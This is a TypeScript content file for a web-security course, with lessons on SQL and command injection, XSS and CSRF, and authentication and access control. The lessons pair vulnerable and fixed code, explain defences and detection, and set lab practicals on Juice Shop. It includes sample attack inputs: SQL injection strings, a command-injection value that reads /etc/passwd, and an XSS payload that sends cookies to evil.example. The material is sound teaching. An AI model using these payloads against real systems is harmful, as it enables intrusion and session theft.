import { lesson, module } from "@/lib/lesson-builder";
import { CS_ETHICAL_HACKING_MODULE } from "@/content/cyber-security/ethical-hacking";
import { CS_DEFENSIVE_SECURITY_MODULE } from "@/content/cyber-security/defensive-security";
import type { CourseModule } from "@/lib/courses";

/**
 * Security — web security, ethical hacking and defensive security.
 *
 * Three modules following the program outline. Everything offensive here is
 * taught against deliberately vulnerable practice targets (OWASP Juice Shop,
 * DVWA, your own VMs); the legal and ethical framing is part of the content,
 * not a footnote.
 */

const WEB_SECURITY_MODULES: CourseModule[] = [
  module("web-security", "01 · Web security", "The attacks behind most real breaches, and the code that stops them.", [
    lesson({
      id: "injection-attacks",
      title: "Injection: SQL and command",
      summary:
        "Injection happens whenever data a user typed is treated as code. It has been near the top of the OWASP Top Ten for twenty years because it is easy to write by accident and devastating when found. This lesson shows exactly how SQL injection and command injection work, how to find them, and the one habit that eliminates them: never build code out of strings.",
      sections: [
        {
          heading: "What injection is",
          kind: "definition",
          body:
            "**Injection** is a vulnerability where untrusted input changes the *structure* of a command instead of just supplying a *value* inside it. The program meant to ask \"find the user named X\"; the attacker makes it ask \"find the user named X, or everyone\".\n\nIt appears wherever a program assembles a command from text: SQL queries, shell commands, LDAP filters, even HTML (which is why cross-site scripting is a cousin). The fix is always the same shape: **keep code and data separate** by using an API that accepts them as separate arguments. Parameterised queries for SQL, argument arrays for processes.",
        },
        {
          heading: "Worked example: SQL injection, step by step",
          kind: "example",
          body:
            "The login below builds its query with string concatenation. Trace what happens when the attacker types `' OR '1'='1` as the username and anything as the password.\n\n1. The developer intended: `SELECT * FROM users WHERE name = 'ama' AND password = 'secret'`.\n2. With the payload, the query becomes: `SELECT * FROM users WHERE name = '' OR '1'='1' AND password = 'x'`.\n3. `'1'='1'` is always true, so the `WHERE` matches rows regardless of the password. The first user in the table is returned, and that is usually the administrator.\n\nA comment sequence makes it cleaner: username `admin'--` turns the rest of the line into a comment, so the password check disappears entirely. The fixed version passes the values separately; the database never parses them as SQL.",
          code:
            "# VULNERABLE: the input becomes part of the SQL text\nquery = f\"SELECT * FROM users WHERE name = '{username}' AND password = '{password}'\"\ncursor.execute(query)\n\n# FIXED: placeholders; the driver sends values out-of-band\ncursor.execute(\n    \"SELECT * FROM users WHERE name = %s AND password_hash = %s\",\n    (username, hash_password(password)),\n)",
          language: "python",
          codeLabel: "The same query, broken and fixed",
        },
        {
          heading: "Command injection",
          kind: "paragraph",
          body:
            "Same idea, different interpreter. A \"ping this host\" feature that runs `ping -c 1 \" + host` lets an attacker supply `8.8.8.8; cat /etc/passwd`. The shell sees two commands.\n\nThe fix is to never go through a shell with user data: pass arguments as a list (`subprocess.run([\"ping\", \"-c\", \"1\", host])`), validate the input against what it should look like (an IP address matches a tight regex), and run the service as a user with no interesting permissions so that a bypass gains little.",
          code:
            "import re, subprocess\n\nIPV4 = re.compile(r\"^\\d{1,3}(\\.\\d{1,3}){3}$\")\n\ndef ping(host: str) -> str:\n    if not IPV4.match(host):\n        raise ValueError(\"not an IPv4 address\")\n    result = subprocess.run([\"ping\", \"-c\", \"1\", host], capture_output=True, text=True, timeout=5)\n    return result.stdout",
          language: "python",
          codeLabel: "Allow-list the input, never use shell=True",
        },
        {
          heading: "Common mistakes and misconceptions",
          kind: "warning",
          body:
            "- **Escaping quotes by hand.** Every hand-rolled escaper has been bypassed. Use parameters.\n- **Validating on the client only.** The attacker does not use your form; they use `curl`.\n- **Blocking the word `SELECT`.** Attackers write `SeLeCt`, or use encodings. Deny-lists lose; parameters win.\n- **Thinking an ORM makes you safe.** Most ORMs have a raw-query escape hatch, and that is where injection returns.",
        },
        {
          heading: "Why parameterised queries work",
          kind: "definition",
          body:
            "A database processes a statement in stages: it parses the text into a tree of operations, plans how to run it, then executes it. Concatenation lets attacker-supplied characters change the parse tree in stage one. A **prepared statement** separates the stages: the text, with placeholders, is parsed once; the values are sent separately and bound to the placeholders as typed data. A value bound to a placeholder can contain any characters, including quotes and semicolons, and it is still only a value.\n\nThree limits matter in practice. Placeholders cannot stand in for identifiers such as table or column names, or for keywords such as the direction of an ORDER BY. Those must come from a fixed allow-list in code, never from user input. Values used with LIKE still need their wildcard characters (% and _) escaped if the search should be literal. And a stored procedure is only as safe as its body: one that builds dynamic SQL from its arguments reintroduces the whole problem inside the database.",
        },
        {
          heading: "Detecting injection before and after release",
          kind: "paragraph",
          body:
            "Injection is found most reliably by testing every input that reaches a query, with a stream of inputs that include a single quote, a double quote, a semicolon, a comment marker and a long string. Any response that changes shape, returns a database error message or takes noticeably longer is worth investigating. In production, watch for spikes in database error rates, for SQL keywords in application logs, and for 500 responses clustered on one endpoint. Web application firewalls add a useful signature layer but are easy to evade and must not be the only control. Defenders can run the same tools as attackers, such as sqlmap and Burp, against their own staging systems on a schedule, and treat every new finding as a regression to explain.",
        },
        {
          heading: "Tools for this lesson",
          kind: "table",
          rows: [
            ["Tool", "What it is for", "Where to get it"],
            ["OWASP Juice Shop", "Deliberately vulnerable web application with a scoreboard", "github.com/juice-shop/juice-shop (Docker image bkimminich/juice-shop)"],
            ["DVWA", "Damn Vulnerable Web Application, with adjustable security levels", "github.com/digininja/DVWA"],
            ["Burp Suite Community Edition", "Intercepting and modifying HTTP requests", "portswigger.net (Community Edition download)"],
            ["sqlmap", "Automated SQL injection testing against authorised lab targets", "sqlmap.org"],
            ["Semgrep", "Static analysis rules that flag injection patterns in source code", "semgrep.dev (pip install semgrep)"],
            ["Python sqlite3", "A small database for building the vulnerable and fixed versions yourself", "Standard library"],
          ],
        },
        {
          heading: "Practicals",
          kind: "exercise",
          body:
            "Run every target on your own machine, bound to localhost. Never point these tools at a site you are not authorised to test.",
          items: [
            "Run Juice Shop with `docker run -d -p 3000:3000 bkimminich/juice-shop` and open `http://localhost:3000`. Find the scoreboard and list three challenges in the injection category.",
            "Reproduce the login injection from the worked example against the Juice Shop login form. Record the request body and the response that shows the account you entered.",
            "Route your browser through Burp Suite Community, intercept the login request, and replay it with a modified email field. Note the difference in response length and status.",
            "Build a 20-line Python program with an SQLite users table. Write the concatenated query, exploit it with the payload from the lesson, then replace it with a parameterised query and show that the same payload now fails.",
            "Run `semgrep scan --config auto` over the vulnerable version. Confirm that it flags the concatenated query, then run it over the fixed version and explain its result.",
            "Write a test that submits ten injection payloads to the fixed endpoint and asserts that none returns another user's record.",
            "In one paragraph, explain why the command-injection fix does not depend on escaping quotes, and name the call that avoids the shell.",
          ],
        },
      ],
      challenge:
        "Install OWASP Juice Shop locally (one Docker command). Find the login SQL injection, log in as admin, then open the source and write the parameterised query that would have stopped you.",
      keyPoints: [
        "Define injection as input changing the structure of a command",
        "Trace how a payload rewrites a concatenated SQL query",
        "Fix SQL injection with parameterised queries",
        "Fix command injection with argument lists and strict input validation",
      ],
      exercises: [
        "Why does `admin'--` work against the vulnerable login? What does the final query look like?",
        "A search box runs `LIKE '%\" + term + \"%'`. Write the injection and the fix.",
        "Explain to a product manager why \"we filter out bad words\" is not a defence.",
        "Find one raw-query call in any open-source project and judge whether it is safe.",
      ],
    }),
    lesson({
      id: "xss-csrf-and-browser-defences",
      title: "XSS, CSRF and the browser's defences",
      summary:
        "The browser is where web attacks land. Cross-site scripting runs the attacker's JavaScript in your user's session; cross-site request forgery makes the user's browser act without their knowledge. This lesson explains both precisely, demonstrates them against a practice app, and covers the modern defences: output encoding, Content Security Policy, SameSite cookies and the tokens that frameworks add for you.",
      sections: [
        {
          heading: "Cross-site scripting (XSS)",
          kind: "definition",
          body:
            "**XSS** is injection into HTML. If a page prints user input without encoding it, the input can contain `<script>` and the browser will run it *as the site*: reading cookies, making requests with the victim's session, rewriting the page to capture a password.\n\nThree flavours:\n\n- **Stored**: the payload is saved (a comment, a profile name) and runs for everyone who views it.\n- **Reflected**: the payload is in a URL and runs when the victim clicks a crafted link.\n- **DOM-based**: client-side JavaScript itself writes untrusted data into the page with `innerHTML`.\n\nThe defence is **contextual output encoding**: turn `<` into `&lt;` when writing into HTML, and use the right encoding for attributes, URLs and JavaScript. Modern frameworks (React, Vue, templating engines) do this by default — the danger is the escape hatch (`dangerouslySetInnerHTML`, `v-html`, `innerHTML`).",
          code:
            "// Stored XSS payload typed into a product review field:\n<img src=x onerror=\"fetch('https://evil.example/steal?c='+document.cookie)\">\n\n// Safe rendering in React: the text is encoded automatically\n<p>{review.body}</p>\n\n// Dangerous: trusts the string as markup\n<p dangerouslySetInnerHTML={{ __html: review.body }} />",
          language: "jsx",
          codeLabel: "A payload with no <script> tag at all",
        },
        {
          heading: "Cross-site request forgery (CSRF)",
          kind: "paragraph",
          body:
            "Browsers attach cookies to every request to a site, including requests started by *another* site. So if your bank changes the email address on a plain `POST /settings`, a hidden form on an attacker's page can submit that request from the victim's logged-in browser.\n\nDefences, in the order you should apply them:\n\n1. **`SameSite=Lax` or `Strict` on the session cookie.** The browser will not send it on cross-site POSTs. Default in modern browsers, but set it explicitly.\n2. **CSRF tokens.** A random value tied to the session, included in every state-changing form and checked on the server. Most frameworks (Django, Rails, Next.js server actions) handle this.\n3. **Never change state on GET.** A link should not delete anything.",
        },
        {
          heading: "Content Security Policy",
          kind: "example",
          body:
            "**CSP** is an HTTP header that tells the browser which sources of script, style and images are allowed. Even if an XSS payload gets into the page, a strict policy stops it from running or from sending data to the attacker's server. Start with a report-only policy to see what would break, then enforce.",
          code:
            "Content-Security-Policy:\n  default-src 'self';\n  script-src 'self' 'nonce-r4nd0m';\n  img-src 'self' data: https://cdn.codemasterghana.com;\n  connect-src 'self' https://api.paystack.co;\n  frame-ancestors 'none';\n  base-uri 'self';\n\nSet-Cookie: session=...; HttpOnly; Secure; SameSite=Lax; Path=/",
          language: "text",
          codeLabel: "Two headers that defeat most of this lesson",
        },
        {
          heading: "Common mistakes and misconceptions",
          kind: "warning",
          body:
            "- **Filtering `<script>` and calling it done.** Event handlers (`onerror`, `onload`) and `javascript:` URLs do not need the tag.\n- **Forgetting `HttpOnly`.** Without it, any XSS can read the session cookie directly.\n- **`unsafe-inline` in CSP.** It switches CSP off for scripts. Use nonces or hashes.\n- **Assuming an API is immune to CSRF because it returns JSON.** If it accepts form-encoded POSTs with cookie auth, it is not.",
        },
        {
          heading: "Context decides the encoding",
          kind: "definition",
          body:
            "Output encoding is not one operation. Text placed in an HTML body needs `<`, `>` and `&` converted to entities. Text placed in an HTML attribute needs quotes encoded too. Text placed inside a JavaScript string needs JavaScript escaping, and a URL needs percent-encoding. A value that is safe in one of these contexts can be dangerous in another: a `javascript:` address is harmless as text but executes when it becomes the target of a link.\n\nThe DOM APIs make the choice visible. Assigning to `textContent` treats the value as text. Assigning to `innerHTML` parses it as markup and runs any script it contains. When a feature genuinely needs rich text, such as a formatted comment, pass the markup through a sanitiser such as DOMPurify with a strict allow-list of tags and attributes, and keep the sanitised output as the only thing the page renders.",
        },
        {
          heading: "Detecting XSS and CSRF in production",
          kind: "paragraph",
          body:
            "A Content Security Policy can report as well as block. Set a `report-to` or `report-uri` directive pointing at an endpoint you control, and every violation becomes a record: the blocked resource, the page, and often the script that tried to run. A sudden spike in violations for inline scripts is a strong signal of an injection that is being tested or exploited. For CSRF, log state-changing requests that arrive without the expected token or with a foreign Origin header, and alert when the rate of rejections rises. Both signals are cheap to collect, and both are more useful than a scanner's one-time report.",
        },
        {
          heading: "Tools for this lesson",
          kind: "table",
          rows: [
            ["Tool", "What it is for", "Where to get it"],
            ["Browser developer tools", "Inspecting the DOM, cookies, headers and network requests", "Built into Chrome, Edge and Firefox"],
            ["Burp Suite Community Edition", "Replaying cross-site requests and reading response headers", "portswigger.net"],
            ["OWASP ZAP", "Scanning a lab application for missing headers and reflected input", "zaproxy.org"],
            ["Google CSP Evaluator", "Checking a Content Security Policy for weaknesses", "csp-evaluator.withgoogle.com"],
            ["helmet (Node.js)", "Setting secure HTTP headers, including a starting Content Security Policy", "npmjs.com/package/helmet"],
            ["Python http.server", "Serving a cross-site test page for CSRF experiments", "Standard library"],
          ],
        },
        {
          heading: "Practicals",
          kind: "exercise",
          body:
            "Use Juice Shop and a small lab application that you write yourself. Keep the test page on a different port so that the requests are genuinely cross-site.",
          items: [
            "In Juice Shop, enter the payload from the Juice Shop DOM XSS challenge into the search box, and confirm that the alert runs. Then use DevTools to find the element that received the input, and say whether it was written with text or with markup.",
            "Run `curl -I http://localhost:3000` and list which of Content-Security-Policy, Strict-Transport-Security, X-Content-Type-Options and Referrer-Policy are missing.",
            "Write a small Express application with helmet enabled. Render a user comment through the template engine, view the page source, and confirm that a payload appears as escaped text.",
            "Set a session cookie with HttpOnly, Secure and SameSite=Lax in your lab application. Serve a page on another port containing an auto-submitting form that posts to a state-changing endpoint. Show in the Network tab that the browser omits the cookie.",
            "Change the cookie to SameSite=None; Secure and repeat the test. Record the difference and explain why a CSRF token is still the stronger defence for forms.",
            "Paste your Content-Security-Policy into the Google CSP Evaluator and fix the highest-severity finding. Retest.",
            "Write 150 words explaining the difference between XSS and CSRF, naming one defence for each.",
          ],
        },
      ],
      challenge:
        "In Juice Shop, find a stored XSS and a reflected XSS. Then add a Content-Security-Policy header (via a reverse proxy or browser extension) and show that the same payload no longer executes.",
      keyPoints: [
        "Distinguish stored, reflected and DOM-based XSS",
        "Explain why output encoding, not input filtering, stops XSS",
        "Describe how CSRF abuses the browser's cookie behaviour and the three defences",
        "Write a starting Content Security Policy and secure cookie flags",
      ],
      exercises: [
        "Why does `HttpOnly` not stop an attacker from *using* a session via XSS, even though they cannot read the cookie?",
        "A site uses a bearer token in `localStorage` instead of cookies. Which of XSS and CSRF gets worse, and which gets better?",
        "Write the CSP for a page that loads scripts only from itself and fonts from Google Fonts.",
        "Find the escape hatch in a framework you use and grep a project for it.",
      ],
    }),
    lesson({
      id: "authentication-and-access-control",
      title: "Authentication, sessions and access control",
      summary:
        "Broken access control is now the number one web vulnerability. It is not clever; it is a server that forgets to check who is asking. This lesson covers how to store passwords, how sessions and JWTs work and fail, multi-factor authentication, and the systematic way to test every endpoint for the question 'but am I allowed?'.",
      sections: [
        {
          heading: "Storing passwords",
          kind: "paragraph",
          body:
            "Never store a password. Store a **slow, salted hash** of it: `bcrypt`, `scrypt` or `argon2id`. Slow matters: an attacker with a leaked database tries billions of guesses per second against a fast hash like MD5 or SHA-256, and thousands per second against bcrypt. The **salt** is a random value stored alongside the hash so that two users with the same password have different hashes and precomputed tables are useless.\n\nAlso: enforce a minimum length (12+), check new passwords against known-breached lists, rate-limit login attempts per account *and* per IP, and never say which of username or password was wrong.",
          code:
            "import bcrypt\n\ndef hash_password(plain: str) -> bytes:\n    return bcrypt.hashpw(plain.encode(), bcrypt.gensalt(rounds=12))\n\ndef verify(plain: str, stored: bytes) -> bool:\n    return bcrypt.checkpw(plain.encode(), stored)",
          language: "python",
          codeLabel: "The whole of password storage, correctly",
        },
        {
          heading: "Sessions and tokens",
          kind: "definition",
          body:
            "After login the server must recognise the user on later requests. Two designs:\n\n- **Server-side sessions**: a random ID in a cookie, looked up in a store. Easy to revoke (delete the row). The cookie must be `HttpOnly; Secure; SameSite`.\n- **JWTs**: a signed token the client holds; the server verifies the signature and trusts the claims inside. Scales without a store, but *cannot be revoked* before expiry, so keep lifetimes short and pair with a refresh token.\n\nJWT mistakes to test for: accepting `alg: none`, using a weak HMAC secret that can be cracked offline, confusing RS256 and HS256, and not checking `exp`.",
        },
        {
          heading: "Worked example: insecure direct object reference",
          kind: "example",
          body:
            "An invoices page fetches `/api/invoices/1042`. You are logged in as yourself. Change the number to `1041`. If you see someone else's invoice, the server checked that you are *logged in* but not that you *own* the resource. This is **IDOR**, the most common form of broken access control, and it is found by nothing more than changing a number.\n\nThe fix is a query that includes the owner, so that a wrong ID simply returns nothing.",
          code:
            "# BROKEN: authenticated, but not authorised\ninvoice = db.query(\"SELECT * FROM invoices WHERE id = %s\", (invoice_id,))\n\n# FIXED: the owner is part of the lookup\ninvoice = db.query(\n    \"SELECT * FROM invoices WHERE id = %s AND user_id = %s\",\n    (invoice_id, current_user.id),\n)\nif invoice is None:\n    abort(404)   # not 403: do not confirm the record exists",
          language: "python",
          codeLabel: "Authorisation belongs in the query",
        },
        {
          heading: "Common mistakes and misconceptions",
          kind: "warning",
          body:
            "- **Checking roles in the UI only.** Hiding the Delete button is not authorisation. The API must refuse.\n- **Sequential IDs plus no ownership check.** Use UUIDs *and* check ownership; UUIDs alone are obscurity, not security.\n- **SMS as the only second factor.** SIM-swap fraud is common in Ghana. Prefer authenticator apps or passkeys.\n- **Long-lived JWTs with no refresh.** A stolen token is valid until it expires; make that minutes, not months.",
        },
        {
          heading: "A threat model for authentication",
          kind: "definition",
          body:
            "Authentication attacks fall into recognisable families, and each has a different signature. **Brute force** tries many passwords against one account. **Password spraying** tries one or two common passwords against many accounts, staying under per-account thresholds. **Credential stuffing** replays username and password pairs leaked from other breaches, which works because people reuse passwords. **Account enumeration** reveals which accounts exist, through different error messages or response times on login and password reset. **Session fixation** keeps a session identifier the attacker already knows after the victim signs in.\n\nThe corresponding controls are: uniform responses for login and reset; rate limits per account and per source, with progressive delays; breach-password screening at sign-up and change; MFA on every human identity; a fresh session identifier at every sign-in; and invalidation of sessions on sign-out and on password change.",
        },
        {
          heading: "Detecting account attacks",
          kind: "paragraph",
          body:
            "Authentication logs contain strong signals if they are read in aggregate. Many failures across many accounts from one source suggests spraying. Successful logins from a new country or a new device immediately after a run of failures suggests a compromised password. A flood of password-reset emails to one mailbox suggests someone is probing recovery. Sudden bursts of MFA prompts that the user did not start, which attackers use to exhaust or confuse a user into approving a request, should be alerted on and reported to the user. Feed these events into the same detection pipeline described in the defensive security module, and tune the thresholds on real traffic before relying on them.",
        },
        {
          heading: "Tools for this lesson",
          kind: "table",
          rows: [
            ["Tool", "What it is for", "Where to get it"],
            ["Python PyJWT and bcrypt", "Decoding tokens and hashing passwords in lab code", "pip install pyjwt bcrypt"],
            ["jwt.io (use with care)", "Reference for JWT structure; decode locally where possible, since pasting real tokens into a website discloses them", "jwt.io"],
            ["hashcat", "Testing whether an HMAC secret in a lab token is weak (JWT mode 16500)", "hashcat.net"],
            ["ffuf", "Fuzzing and rate-limit testing against authorised lab endpoints", "github.com/ffuf/ffuf"],
            ["Juice Shop", "Authentication and access-control challenges on a safe target", "github.com/juice-shop/juice-shop"],
            ["A two-user lab application", "Testing IDOR and ownership checks against your own code", "Written in the practical"],
          ],
        },
        {
          heading: "Practicals",
          kind: "exercise",
          body:
            "Use your own lab application and Juice Shop. Do not paste real tokens or passwords into any website.",
          items: [
            "Decode a JWT from a Juice Shop login locally with Python: split on the dots, base64url-decode the first two parts, and print the header and payload. Record the `alg` and `exp` values.",
            "Hash the same password with bcrypt at cost 12 and with SHA-256. Use `timeit` to time one hundred thousand SHA-256 hashes against one bcrypt hash, and explain the difference in a sentence.",
            "Build a lab endpoint `/api/invoices/<id>` that returns an invoice without checking ownership. Create two users and invoices for each. As user A, read an invoice belonging to user B and record the response.",
            "Fix the endpoint by adding the owner to the query, return 404 for invoices that do not belong to the caller, and rerun the test until user A is refused.",
            "Write a script that submits fifty failed logins for one account. Observe how your lab application responds, then add a rate limit (for example with flask-limiter or express-rate-limit) and show the 429 response.",
            "Find one authentication-related challenge in Juice Shop and write up the weakness, the proof and the fix in the five-part finding format from the ethical hacking module.",
            "Write a list of the cookie and session settings your lab application uses now, and the reason for each.",
          ],
        },
      ],
      challenge:
        "Pick any app you have built or have permission to test. For every endpoint, make a table: who should be allowed, then try it as a different user, as a logged-out user, and with another user's ID. Fix every row that fails.",
      keyPoints: [
        "Hash passwords with bcrypt/argon2 and explain why slow hashes matter",
        "Compare server sessions with JWTs and their failure modes",
        "Find IDOR by changing identifiers and fix it in the query",
        "Test authorisation systematically rather than hoping",
      ],
      exercises: [
        "Why return 404 rather than 403 for an invoice the user does not own?",
        "A JWT has `exp` thirty days out. List the consequences if it leaks and two mitigations.",
        "Why is 'incorrect password' a worse error message than 'incorrect username or password'?",
        "Design login rate limiting that stops brute force without letting an attacker lock out a victim.",
      ],
    }),
  ]),

];

/** The complete Security course: web security (this file), ethical hacking and defensive security. */
export const CYBER_SECURITY_OFFENSE_AND_DEFENSE_MODULES: CourseModule[] = [
  ...WEB_SECURITY_MODULES,
  CS_ETHICAL_HACKING_MODULE,
  CS_DEFENSIVE_SECURITY_MODULE,
];
